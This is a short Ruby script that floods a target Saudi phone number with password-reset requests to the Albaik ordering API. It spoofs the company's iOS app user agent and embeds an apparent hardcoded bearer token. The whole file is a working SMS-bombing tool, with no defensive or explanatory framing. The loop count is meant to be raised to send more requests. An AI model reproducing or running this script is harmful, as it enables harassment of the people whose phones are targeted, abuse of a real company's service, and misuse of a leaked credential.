require 'httparty'
require 'json'

print "phone number: "
phone = gets.chomp

# Set the URL and data for the POST request
url = 'https://ordering.albaikcloud.com/api/v1/passwords'
data = { "password" => { "telephone" => "+966#{phone}" } }
headers = {
  'Content-Type' => 'application/json',
  'Accept-Encoding' => 'gzip, deflate, br',
  'Connection' => 'keep-alive',
  'Accept' => '*/*',
  'User-Agent' => 'ios/6.9.501 (com.albaik.customer; iPhone 13 Pro; 16.3.1)',
  'Accept-Language' => 'ar',
  'Authorization' => 'Bearer RqaU6d9BjYt5ibrbLjq9xuCqBDECTNH7',
  'Content-Length' => data.to_json.length.to_s
}

# Make the POST request multiple times (adjust '10' to the desired number of requests)
10.times do |index|
  response = HTTParty.post(url, headers: headers, body: data.to_json)
  if response.code == 200
    puts "Request #{index + 1} sent successfully!"
  else
    puts "Request #{index + 1} failed with response code: #{response.code}"
  end
end
